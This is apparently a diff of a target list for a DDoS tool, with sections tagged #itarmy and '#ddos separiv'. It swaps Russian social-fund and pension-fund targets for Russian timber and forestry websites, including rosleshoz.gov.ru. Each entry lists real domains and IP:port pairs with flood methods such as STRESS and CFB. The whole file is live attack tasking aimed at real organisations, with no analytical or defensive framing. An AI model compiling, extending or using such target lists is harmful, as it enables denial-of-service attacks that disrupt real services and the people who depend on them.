@@ -1,20 +1,26 @@
 #zhnec
 
-https://cargocash.ru/ http://cargocash.ru/ tcp://94.228.116.171:80 tcp://94.228.116.171:443 --http-methods bypass DGB
+https://ukraineofficial.xyz/#/ http://ukraineofficial.xyz/#/ --http-methods CFB STRESS
 
-#https://iml.ru/ tcp://46.243.184.194:443 tcp://146.185.211.227:443 tcp://146.185.211.227:80 --http-methods STRESS
-#http://portal.iml.ru https://portal.iml.ru http://argocd.iml.ru https://argocd.iml.ru --http-methods STRESS
 
 
 #itarmy
 
-http://fss.gov.ru/ http://fss.ru http://forum.fss.ru http://www.fss.ru https://autodiscover.fss.ru  --http-methods STRESS
-tcp://193.148.44.189:80 tcp://193.148.44.189:443 tcp://193.148.44.179:53 tcp://193.148.44.179:25 tcp://193.148.44.179:443 
-tcp://193.148.44.180:25 tcp://193.148.44.180:53 tcp://193.148.44.186:80 tcp://193.148.44.186:443
-tcp://193.148.44.187:80 tcp://193.148.44.187:443 tcp://193.148.44.29:80 tcp://193.148.44.29:443
-tcp://195.161.52.80:80 tcp://195.161.52.80:443 tcp://195.161.53.77:53
-https://portal.fss.ru https://data.fss.ru https://docs.fss.ru https://beta.fss.ru https://pfrf.ru --http-methods STRESS
-https://hosting.pfrf.ru https://school.pfrf.ru https://es.pfrf.ru https://www.es.pfrf.ru --http-methods STRESS
+https://woodresource.ru tcp://80.87.197.227:22 tcp://80.87.197.227:80 tcp://80.87.197.227:443 --http-methods STRESS
+https://old.woodresource.ru tcp://62.109.13.251:22 tcp://62.109.13.251:53 tcp://62.109.13.251:80 tcp://62.109.13.251:111 tcp://62.109.13.251:443 --http-methods STRESS
+https://rosles.net tcp://87.236.16.235:21 tcp://87.236.16.235:80 tcp://87.236.16.235:443 --http-methods STRESS
+https://lesoseka.com tcp://185.154.54.3:21 tcp://185.154.54.3:22 tcp://185.154.54.3:25 tcp://185.154.54.3:53 --http-methods STRESS
+tcp://185.154.54.3:80 tcp://185.154.54.3:110 tcp://185.154.54.3:111 tcp://185.154.54.3:143 tcp://185.154.54.3:443 tcp://185.154.54.3:465
+https://rosleshoz.gov.ru tcp://82.202.190.169:80 tcp://82.202.190.169:443 --http-methods STRESS
+https://lesozagotovka.com tcp://5.23.51.63:21 tcp://5.23.51.63:22 tcp://5.23.51.63:80 tcp://5.23.51.63:443 --http-methods STRESS
+https://lesegais.ru tcp://95.173.158.40:25 tcp://95.173.158.40:80 tcp://95.173.158.40:443 --http-methods STRESS
+https://m.lesegais.ru tcp://95.173.158.38:80 tcp://95.173.158.38:443 --http-methods STRESS
+https://www.lesprom.com/ru/ tcp://93.95.99.221:21 tcp://93.95.99.221:25 tcp://93.95.99.221:80 --http-methods STRESS
+tcp://93.95.99.221:111 tcp://93.95.99.221:443 tcp://93.95.99.221:465 
+https://www.lesonline.ru/ tcp://92.62.112.153:80 tcp://92.62.112.153:443 --http-methods STRESS
+https://пиломатериалы.рф/ tcp://185.32.58.202:80 tcp://185.32.58.202:443 --http-methods STRESS
+https://www.wood.ru/ tcp://83.222.4.160:80 tcp://83.222.4.160:443 --http-methods STRESS
+
 
 #ddos separiv
 
